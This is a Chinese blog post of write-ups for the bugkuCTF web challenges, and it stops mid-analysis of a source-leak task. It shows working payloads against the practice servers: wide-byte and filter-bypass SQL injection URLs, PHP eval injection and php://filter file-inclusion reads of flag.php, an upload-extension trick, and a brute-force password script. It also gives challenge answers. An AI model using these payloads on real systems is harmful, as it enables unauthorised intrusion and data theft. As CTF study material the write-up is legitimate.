<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
  
  
  
  
  <title>bugkuCTF Web | Grim&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x01 web2">
<meta property="og:type" content="article">
<meta property="og:title" content="bugkuCTF Web">
<meta property="og:url" content="http://yoursite.com/2018/07/06/bugkuCTF web/index.html">
<meta property="og:site_name" content="Grim&#39;s blog">
<meta property="og:description" content="0x01 web2">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/DJZOH71I2GPD2JJXIR%28J@77.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/L0T%25U3FFEW9X%7D5X%5BHGI~B@9.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/Z7M%5BW@HK$N~K3G8TDP%29A%7DFX.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/%7D@Q~%5BAH4Y3EBNO94_P%25O%287D.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/1R_M%28G@_M69%25N%5D@%5BG%60_N%2525.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/LC2P5AV4XG%28%285S04CW%60CT7D.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/13.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/~KVH$A%5BP%5BT@%29QR%5DIW8B%5D8%7DB.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/%5B_%5BFSF8@9%5DRF10%7BIBJ8T~%602.png">
<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/$S%60~IRQ_VC%5DZNN%29DQ5B%7D58V.png">
<meta property="og:updated_time" content="2018-07-06T10:37:20.186Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="bugkuCTF Web">
<meta name="twitter:description" content="0x01 web2">
<meta name="twitter:image" content="http://p1vrkwaxt.bkt.clouddn.com/DJZOH71I2GPD2JJXIR%28J@77.png">
  
    <link rel="alternative" href="/atom.xml" title="Grim&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg">
  
  
  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

        <a href="/" class="profilepic">
            
            <img lazy-src="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Mr1.Grim</a></h1>
        </hgroup>
        
        <p class="header-subtitle">人生有梦，各自精彩</p>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="/archives/">文章目录</a></li>
                        
                            <li><a  href="/about/">个人简介</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github"  target="_blank" href="https://github.com/ntwyc2018/ntwyc2018.github.io" title="github">github</a>
                            
                                <a class="fl weibo"  target="_blank" href="https://weibo.com/u/5597557177?refer_flag=1001030101_&is_all=1" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                
                
                <section class="switch-part switch-part3">
                
                    <div id="js-aboutme">人生有梦，各自精彩</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mr1.Grim</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Mr1.Grim</a></h1>
            </hgroup>
            
            <p class="header-subtitle">人生有梦，各自精彩</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/archives/">文章目录</a></li>
                
                    <li><a href="/about/">个人简介</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="https://github.com/ntwyc2018/ntwyc2018.github.io" title="github">github</a>
                    
                        <a class="weibo" target="_blank" href="https://weibo.com/u/5597557177?refer_flag=1001030101_&is_all=1" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>
    </div>
</nav>
      <div class="body-wrap"><article id="post-bugkuCTF web" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/bugkuCTF web/" class="article-date">
      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      bugkuCTF Web
    </h1>
  


      </header>
      
      <div class="article-info article-info-post">
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="0x01-web2"><a href="#0x01-web2" class="headerlink" title="0x01 web2"></a>0x01 web2</h3><a id="more"></a>
<p>点开后是一张动图，查看源代码发现flag</p>
<h3 id="0x02-文件上传测试"><a href="#0x02-文件上传测试" class="headerlink" title="0x02 文件上传测试"></a>0x02 文件上传测试</h3><p>上传一张jpg格式的图片抓包后后缀改为php即可</p>
<h3 id="0x03-计算器"><a href="#0x03-计算器" class="headerlink" title="0x03 计算器"></a>0x03 计算器</h3><p>下面给出三种方法</p>
<ul>
<li>F12修改源代码长度为3</li>
<li>火狐hackbar port输入答案</li>
<li>burpsuite抓包修改长度答案<h3 id="0x04-web基础-GET"><a href="#0x04-web基础-GET" class="headerlink" title="0x04 web基础$_GET"></a>0x04 web基础$_GET</h3>url增加如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?what=flag</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x05-web基础-POST"><a href="#0x05-web基础-POST" class="headerlink" title="0x05 web基础$_POST"></a>0x05 web基础$_POST</h3><p>因为是post，无法直接url上，利用火狐hackbar post过去</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/DJZOH71I2GPD2JJXIR%28J@77.png" alt="image"></p>
<h3 id="0x06-矛盾"><a href="#0x06-矛盾" class="headerlink" title="0x06 矛盾"></a>0x06 矛盾</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[&apos;num&apos;];</span><br><span class="line"> if(!is_numeric($num))</span><br><span class="line"> &#123;</span><br><span class="line"> echo $num;</span><br><span class="line"> if($num==1)</span><br><span class="line"> echo &apos;flag&#123;**********&#125;&apos;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理:php弱类型的绕过</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造?num=1a即可</span><br></pre></td></tr></table></figure>
<h3 id="0x07-web3"><a href="#0x07-web3" class="headerlink" title="0x07 web3"></a>0x07 web3</h3><p>点开题目链接弹出对话框没完了，直接禁止再弹出对话框，查看源代码发现如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;</span><br></pre></td></tr></table></figure></p>
<p>可知这是一串html码，在线url解码得到如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;J2sa42ahJK-HS11III&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x08-sql注入"><a href="#0x08-sql注入" class="headerlink" title="0x08 sql注入"></a>0x08 sql注入</h3><ul>
<li>查看源代码发现gb2312，猜想是宽字节注入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df%27</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>报错，证明是宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure>
<p>爆出库sql5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df%27 union select 1,string from sql5.key%23</span><br></pre></td></tr></table></figure>
<p>结合题目爆出key</p>
<h3 id="0x09-域名解析"><a href="#0x09-域名解析" class="headerlink" title="0x09 域名解析"></a>0x09 域名解析</h3><p>题目说把flag.bugku.com解析到120.24.86.145能拿到flag，那就改一下本地的host</p>
<p>打开/etc/hosts，修改里面的内容,增加一条内容，内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">120.24.86.145    flag.bugku.com</span><br></pre></td></tr></table></figure></p>
<p>保存之后，再在浏览器里打开flag.bugku.com就能看到flag。</p>
<h3 id="0x10-SQL注入1"><a href="#0x10-SQL注入1" class="headerlink" title="0x10 SQL注入1"></a>0x10 SQL注入1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//过滤sql</span><br><span class="line">$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);</span><br><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">	if (substr_count($id, $value) &gt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		exit(&apos;包含敏感关键字！&apos;.$value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//xss过滤</span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;;</span><br></pre></td></tr></table></figure>
<p>备注:strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
<p>所以可以利用这个标签来绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=0 uni&lt;b&gt;on sele&lt;b&gt;ct 1,database()#</span><br></pre></td></tr></table></figure></p>
<p>爆出数据库sql3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=0 uni&lt;b&gt;on sele&lt;b&gt;ct 1,hash fr&lt;b&gt;om sql3.key#</span><br></pre></td></tr></table></figure>
<p>爆出flag</p>
<h3 id="0x11-你必须让他停下"><a href="#0x11-你必须让他停下" class="headerlink" title="0x11 你必须让他停下"></a>0x11 你必须让他停下</h3><p>点开后连续不断的刷新网址，用burpsuite抓包发到intruder,随便构造没用的参数发送，根据length观察<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/L0T%25U3FFEW9X%7D5X%5BHGI~B@9.png" alt="image"></p>
<h3 id="0x12-本地包含"><a href="#0x12-本地包含" class="headerlink" title="0x12 本地包含"></a>0x12 本地包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;2333，不只是本地文件包含哦~&apos;; &lt;?php </span><br><span class="line">    include &quot;waf.php&quot;; </span><br><span class="line">    include &quot;flag.php&quot;; </span><br><span class="line">    $a = @$_REQUEST[&apos;hello&apos;]; </span><br><span class="line">    eval( &quot;var_dump($a);&quot;); </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>@$_REQUEST 的意思是获得参数，不论是@$_GET还是@$_POST可以得到的参数@$_REQUEST都能得到。<br>所以构造hello的get参数。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval函数将输入的字符串参数当作PHP程序代码来执行</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>原理:eval命令执行漏洞,把字符串构造成代码，要符合php语法</p>
<p>看了别人的wp，有很多种方法如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt; hello=);print_r(file(&quot;flag.php&quot;)</span><br><span class="line">&lt;2&gt; hello=);var_dump(file(&quot;flag.php&quot;)</span><br><span class="line">&lt;3&gt; hello=file(&quot;flag.php&quot;)</span><br><span class="line">&lt;4&gt; hello=);include(@$_POST[&apos;b&apos;]</span><br><span class="line">    在POST区域：b=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">&lt;5&gt; hello=);include(&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><br></pre></td></tr></table></figure></p>
<p>总结几个要点</p>
<ul>
<li>eval() 函数会把字符串参数当做代码来执行。</li>
<li>file() 函数把整个文件读入一个数组中，并将文件作为一个数组返回。</li>
<li>print_r() 函数只用于输出数组。</li>
<li>var_dump() 函数可以输出任何内容：输出变量的容，类型或字符串的内容，类型，长度。</li>
<li>hello=file(“flag.php”)，最终会得到var_dump(file(“flag.php”))，以数组形式输出文件内容。</li>
<li>include()函数和php://input，php://filter结合很好用，php://filter可以用与读取文件源代码，结果是源代码base64编码后的结果。 <h3 id="0x13-变量1"><a href="#0x13-变量1" class="headerlink" title="0x13 变量1"></a>0x13 变量1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&apos;args&apos;]))&#123;</span><br><span class="line">    $args = $_GET[&apos;args&apos;];</span><br><span class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;var_dump($$args);&quot;);</span><br></pre></td></tr></table></figure>
<ul>
<li>原理:$$为可变变量</li>
<li>超全局数组 GLOBALS（一个包含了全部变量的全局组合数组。变量的名字就是数组的键），传进去之后就会将代码中所有的全局变量打印出来。</li>
<li>?args=GLOBALS<h3 id="0X14-web5"><a href="#0X14-web5" class="headerlink" title="0X14 web5"></a>0X14 web5</h3>查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;BKCTF-WEB4&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=&quot;display:none;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;post&quot; &gt;</span><br><span class="line">看看源代码？&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var p1 = &apos;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&apos;;</span><br><span class="line">var p2 = &apos;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&apos;;</span><br><span class="line">eval(unescape(p1) + unescape(&apos;%35%34%61%61%32&apos; + p2));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;input&quot; name=&quot;flag&quot; id=&quot;flag&quot; /&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape采用ISO Latin字符集对指定的字符串进行编码。所有的空格符、标点符号、特殊字符以及其他非ASCII字符都将被转化成%xx格式的字符编码(xx等于该字符在字符集表里面的编码的16进制数字)。</span><br></pre></td></tr></table></figure>
<p>按照要求进行unescape解密得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure></p>
<p>得到密码:67d709b2b54aa2aa648cf6e87a7114f1,在页面输入得到flag</p>
<h3 id="0x15-flag在index里"><a href="#0x15-flag在index里" class="headerlink" title="0x15 flag在index里"></a>0x15 flag在index里</h3><p>点开后发现url为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=show.php</span><br></pre></td></tr></table></figure></p>
<p>容易想到文件包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>得到一串base64码，解码后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125;</span><br><span class="line">	$file=$_GET[&apos;file&apos;];</span><br><span class="line">	if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x16-输入密码查看flag"><a href="#0x16-输入密码查看flag" class="headerlink" title="0x16 输入密码查看flag"></a>0x16 输入密码查看flag</h3><p>很简单的一道题，burpsuite爆破五位纯数字<br>也可以用脚本爆破密码(下面是借鉴一位朋友的脚本)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">def url(pwd):</span><br><span class="line">    url = &apos;http://120.24.86.145:8002/baopo/?yes&apos;</span><br><span class="line">    header = &#123;</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Xlcteam Browser&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;&apos;pwd&apos;:pwd&#125;</span><br><span class="line">    r = requests.post(url,headers=header,data=data)</span><br><span class="line">    return len(r.content.decode(&apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1=&apos;1234567890&apos;</span><br><span class="line">str2 = itertools.product(str1,repeat=5)</span><br><span class="line"></span><br><span class="line">for x in str2:</span><br><span class="line">    pwd = &apos;&apos;.join(x)</span><br><span class="line">    if url(pwd)!=1140:</span><br><span class="line">        print pwd</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
<h3 id="0x17-点击一百万次"><a href="#0x17-点击一百万次" class="headerlink" title="0x17 点击一百万次"></a>0x17 点击一百万次</h3><p>根据源代码得到关键clicks，直接上火狐hackbar post:clicks=1000000<br><img src="http://p1vrkwaxt.bkt.clouddn.com/Z7M%5BW@HK$N~K3G8TDP%29A%7DFX.png" alt="image"></p>
<h3 id="0x18-备份是个好习惯"><a href="#0x18-备份是个好习惯" class="headerlink" title="0x18 备份是个好习惯"></a>0x18 备份是个好习惯</h3><p>原理:源码泄漏 <br><br>用这个工具即可<br><a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);</span><br><span class="line">$str = substr($str,1);</span><br><span class="line">$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分析源码:11行strstr获得URI从&apos;?&apos;往后(包括&apos;?&apos;)的字符串,</span><br><span class="line">12行去掉&apos;?&apos;，13行把字符串中的&apos;key&apos;替换为空.</span><br></pre></td></tr></table></figure>
